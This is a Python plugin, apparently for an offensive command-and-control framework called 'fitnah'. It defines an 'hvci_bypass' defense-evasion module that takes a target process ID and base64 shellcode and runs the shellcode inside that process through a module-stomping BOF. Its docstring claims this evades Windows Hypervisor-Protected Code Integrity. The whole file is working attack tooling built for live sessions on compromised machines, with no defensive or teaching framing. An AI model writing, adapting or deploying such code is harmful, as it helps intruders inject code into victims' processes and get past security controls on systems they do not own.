"""defense_evasion/hvci_bypass — HVCI-aware shellcode execution via BOF (runs in existing mapped image). MITRE T1542

HVCI (Hypervisor-Protected Code Integrity) blocks RWX allocations and unsigned code.
This plugin routes shellcode execution through module_stomp BOF (kernelcallbacktable),
which writes into an existing mapped DLL section — already signed, already mapped,
never RWX from scratch. Bypasses HVCI's unsigned-code check.
"""
import base64
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class HvciBypass(BasePlugin):
    NAME        = "hvci_bypass"
    DESCRIPTION = "Execute shellcode under HVCI via module-stomp (no RWX alloc). No PowerShell."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1542"
    CATEGORY    = "defense_evasion"
    schema      = ParamSchema().add(
        Param("pid",           int, required=True,  help="Target PID"),
        Param("shellcode_b64", str, required=True,  help="Base64 shellcode"),
    )

    @mitre("T1542")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        pid  = int(params["pid"])
        sc   = base64.b64decode(params["shellcode_b64"].strip())
        args = ctx.bof_pack("ib", pid, sc)
        r    = ctx.bof("kernelcallbacktable", args_b64=args, timeout=30)
        if r["status"] != "ok":
            return ModuleResult.err(f"hvci_bypass failed: {r['output']}")
        return ModuleResult.ok(data=r["output"])
